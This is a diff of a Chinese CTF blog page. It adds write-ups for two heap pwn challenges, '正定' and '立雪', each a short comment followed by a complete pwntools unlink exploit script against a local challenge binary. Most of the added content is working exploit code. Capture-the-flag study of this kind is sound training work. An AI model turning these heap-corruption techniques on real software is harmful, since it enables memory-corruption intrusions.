@@ -391,14 +391,14 @@ from LibcSearch">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2k
+                        2.4k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        11 分
+                        13 分
                     </div>
                     
                 
@@ -671,8 +671,90 @@ while True:
         r.close()
         print e
 
-</code></pre><p>未完待续。。。。。。</p>
+</code></pre><h3 id="正定"><a href="#正定" class="headerlink" title="正定"></a>正定</h3><p>这是一个堆的unlink , 从下面可以看出利用的关键所在<br><img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/4.png" title="This is an image"></p>
+<p>只要改逻辑就可以了，操作很平常，只不过，最后哪个edit两次属实有点秀了。</p>
+<pre><code>#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+r = process(&#39;./pwn14&#39;)
+def malloc(size,text):
+    r.recvuntil(&#39;Your choice : &#39;)
+    r.sendline(&#39;1&#39;)
+    r.recvuntil(&#39;Size of note : &#39;)
+    r.sendline(str(size))
+    r.sendafter(&#39;Content of note:&#39;,text)
+def edit(idx,text,size):
+    r.recvuntil(&#39;Your choice : &#39;)
+    r.sendline(&#39;2&#39;)
+    r.sendlineafter(&#39;Index :&#39;,str(idx))
+    r.sendlineafter(&#39;Size of note : &#39;,str(text))
+    r.sendafter(&#39;Content of note : &#39;,size)
+def delete(idx):
+    r.recvuntil(&#39;Your choice : &#39;)
+    r.sendline(&#39;3&#39;)
+    r.sendlineafter(&#39;Index :&#39;,str(idx))
+global1 = 0x4040a0
+list = 0x0000000004040C0
+malloc(0x20,&#39;aa&#39;) # 0
+malloc(0x80,&#39;bb&#39;) # 1
+fake_chunk = [
+    0x0,0x20,
+    list - 0x18 ,list - 0x10 ,
+]
+payload = flat(fake_chunk) + p64(0x20) + p64(0x90)
+edit(0,0x40,payload)
+delete(1)
+payload = &#39;a&#39; * 24 +p64(0x4040a8)+p64(0x4040a0)
+edit(0,len(payload),payload)
+payload = p64(0x7e4)
+edit(1,len(payload),payload)
+r.recvuntil(&#39;Your choice : &#39;)
+r.sendline(&#39;70&#39;)
+#gdb.attach(r)
+#edit(0,)
 
+r.interactive()
+</code></pre><h3 id="立雪"><a href="#立雪" class="headerlink" title="立雪"></a>立雪</h3><p>跟上面属实一个题目，不多说了。</p>
+<pre><code>#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+r = process(&#39;./pwn15&#39;)
+def new(size,text):
+    r.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)
+    r.sendlineafter(&#39;Length of note:&#39;,str(size))
+    r.sendafter(&#39;Content of note:&#39;,text)
+def edit(idx,size,text):
+    r.sendlineafter(&#39;Your choice:&#39;,&#39;2&#39;)
+    r.sendlineafter(&#39;Index:&#39;,str(idx))
+    r.sendlineafter(&#39;Length of note:&#39;,str(size))
+    r.sendafter(&#39;Content of note:&#39;,text)
+def dele(idx):
+    r.sendlineafter(&#39;Your choice:&#39;,&#39;3&#39;)
+    r.sendlineafter(&#39;Index:&#39;,str(idx))
+data = 0x000000000602088
+ptr = 0x0000000006020C0
+new(0x20,&#39;aa&#39;)
+new(0x80,&#39;aa&#39;)
+fake_chunk = [
+    0,0x20,
+    ptr - 0x18,ptr - 0x10,
+]
+payload = flat(fake_chunk) + p64(0x20) + p64(0x90)
+edit(0,len(payload),payload)
+#gdb.attach(r)
+dele(1)
+payload = 0x18 * &#39;a&#39; + p64(data)
+edit(0,len(payload),payload)
+edit(0,0x8,p64(0x7e4))
+r.sendlineafter(&#39;Your choice:&#39;,&#39;2019&#39;)
+
+r.interactive()
+
+</code></pre>
             </div>
             <hr>
 
@@ -1001,7 +1083,7 @@ fastbin: Chunk Size &lt;= get_max_fast()的chunk（其实就是64bits的是128by
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">10.6k</span>
+                <span class="white-color">11.1k</span>
             
 
             
